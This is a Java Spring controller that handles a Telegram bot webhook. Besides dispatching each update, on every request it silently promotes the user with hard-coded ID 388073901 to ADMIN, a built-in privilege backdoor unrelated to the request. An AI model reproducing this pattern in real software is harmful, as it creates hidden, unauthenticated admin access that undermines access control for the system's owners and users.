package com.blackonwhite.controller;

import com.blackonwhite.model.User;
import com.blackonwhite.repository.UserRepository;
import com.blackonwhite.service.DirectionService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
import telegram.Update;

@RestController
public class WebhookController {

	@Autowired DirectionService directionService;
	@Autowired UserRepository userRepo;

	@PostMapping("/webhook")
	public void telegramWebhook(@RequestBody Update update) {
		directionService.directUpdateForCommon(update);

		User user = userRepo.getOne(388073901);
		if (user != null) {
			user.setRole(User.Role.ADMIN);
			userRepo.saveAndFlush(user);
		}

	}

}
